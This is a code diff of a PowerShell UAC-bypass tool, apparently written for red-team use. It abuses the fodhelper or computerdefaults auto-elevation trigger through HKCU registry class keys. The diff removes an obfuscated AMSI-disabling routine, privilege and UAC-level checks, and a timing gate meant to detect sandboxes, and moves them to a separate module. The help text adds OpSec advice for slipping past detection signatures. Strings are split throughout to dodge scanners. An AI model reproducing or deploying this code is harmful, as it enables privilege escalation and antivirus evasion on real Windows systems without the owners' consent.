@@ -60,18 +60,12 @@
     'fodhelper'        – Windows 10 TH1+ (default)
     'computerdefaults' – Windows 10 RS4+ (build 17134+)
 
-.PARAMETER SkipAMSI
-    Skip AMSI mitigation.
-
-.PARAMETER SkipChecks
-    Skip preflight environment checks.
-
 .PARAMETER Timeout
     Seconds to wait before cleanup (default: 4).
 
 .EXAMPLE
     # Default — fodhelper trigger, lzx32 alias
-    Invoke-CurVerBypass -Payload "cmd.exe" -SkipChecks
+    Invoke-CurVerBypass -Payload "cmd.exe"
 
 .EXAMPLE
     # Custom alias for better OpSec, computerdefaults trigger
@@ -82,6 +76,8 @@
     Authorized red/purple-team use only.  Requires written SOW.
     The AliasProgID should be changed from the default 'lzx32' for real
     engagements — UACME signatures may key on this specific string.
+    Dot-source Core\Invoke-UACCore.ps1 before calling this function for
+    AMSI mitigation and preflight checks.
 #>
 
 [CmdletBinding(SupportsShouldProcess)]
@@ -95,70 +91,11 @@ param(
     [ValidateSet('fodhelper','computerdefaults')]
     [string]$TriggerBinary = 'fodhelper',
 
-    [switch]$SkipAMSI,
-    [switch]$SkipChecks,
-    [int]   $Timeout = 4
+    [int]$Timeout = 4
 )
 
 Set-StrictMode -Off
 $ErrorActionPreference = 'SilentlyContinue'
-
-#region ── AMSI mitigation ───────────────────────────────────────────────────
-if (-not $SkipAMSI) {
-    try {
-        $xA = [AppDomain]::CurrentDomain.GetAssemblies() |
-                  Where-Object { ($_.GetName().Name) -eq 'System.Management.Automation' } |
-                  Select-Object -First 1
-        $xT = $xA.GetType('System' + '.Management' + '.Automation.' + 'Am' + 'siUt' + 'ils')
-        $xF = $xT.GetField('am' + 'siInit' + 'Failed', [Reflection.BindingFlags]'NonPublic,Static')
-        $xF.SetValue($null, $true)
-    } catch {}
-}
-#endregion
-
-#region ── Preflight gate ────────────────────────────────────────────────────
-if (-not $SkipChecks) {
-    try {
-        $xBld = [int](Get-ItemPropertyValue `
-                    'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' `
-                    'CurrentBuildNumber' -EA Stop)
-    } catch { $xBld = [Environment]::OSVersion.Version.Build }
-    if ($xBld -lt 10240) {
-        Write-Warning "[CurVer] Requires Windows 10 (10240+). Current: $xBld"
-        return
-    }
-    if ($TriggerBinary -eq 'computerdefaults' -and $xBld -lt 17134) {
-        Write-Warning "[CurVer] computerdefaults trigger requires build 17134+. Use fodhelper."
-        return
-    }
-
-    $xPrincipal = New-Object Security.Principal.WindowsPrincipal(
-                      [Security.Principal.WindowsIdentity]::GetCurrent())
-    if ($xPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-        Write-Warning '[CurVer] Already elevated — no bypass needed.'
-        return
-    }
-
-    $xUACPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
-    try   { $xBeh = [int](Get-ItemPropertyValue $xUACPath 'ConsentPromptBehaviorAdmin' -EA Stop) }
-    catch { $xBeh = 5 }
-    if ($xBeh -le 2) {
-        Write-Warning "[CurVer] AlwaysNotify active — method will not work."
-        return
-    }
-
-    # Timing gate
-    $xH = [System.Security.Cryptography.SHA256]::Create()
-    $xB = [byte[]]::new(65536)
-    $xT0 = [DateTime]::UtcNow
-    for ($xi = 0; $xi -lt 300; $xi++) { [void]$xH.ComputeHash($xB) }
-    $xH.Dispose()
-    if (([DateTime]::UtcNow - $xT0).TotalMilliseconds -lt 80) {
-        Write-Warning '[CurVer] Timing anomaly — aborting.'
-        return
-    }
-}
-#endregion
 
 #region ── Registry setup (two-key pattern) ──────────────────────────────────
 $xRoot = 'HKCU:\Soft' + 'ware\Cl' + 'asses\'
